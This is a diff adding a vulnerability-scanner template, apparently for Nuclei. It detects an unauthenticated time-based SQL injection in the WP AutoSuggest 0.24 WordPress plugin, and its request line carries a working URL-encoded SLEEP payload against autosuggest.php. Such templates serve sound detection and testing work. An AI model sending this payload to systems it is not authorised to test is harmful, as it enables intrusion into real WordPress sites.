@@ -1,0 +1,32 @@
+id: wp-autosuggest-sql-injection
+
+info:
+  name: WP AutoSuggest 0.24 - SQL Injection
+  author: theamanrawat
+  severity: critical
+  description: |
+    The wp-autosuggest WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.
+  reference:
+    - https://wpscan.com/vulnerability/9188
+    - https://wordpress.org/plugins/wp-autosuggest/
+  metadata:
+    verified: true
+    max-request: 1
+  tags: time-based-sqli,wp-plugin,wp,wp-autosuggest,wpscan,sqli,wordpress
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5202%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%286%29%29%29yRVR%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dwQZ%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%27dwQZ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/xml")'
+          - 'contains(body, "<results>")'
+        condition: and
+# digest: 4a0a004730450221009a03f27658ba9ad4d3d1b0149372125b91906dd847599f30fb9cbee51496312a02201c8b1f10d278e77966a2f2f7f3deeb50c3b58101793ea160bf6c1dd631d3e076:922c64590222798bb761d5b6d8e72950
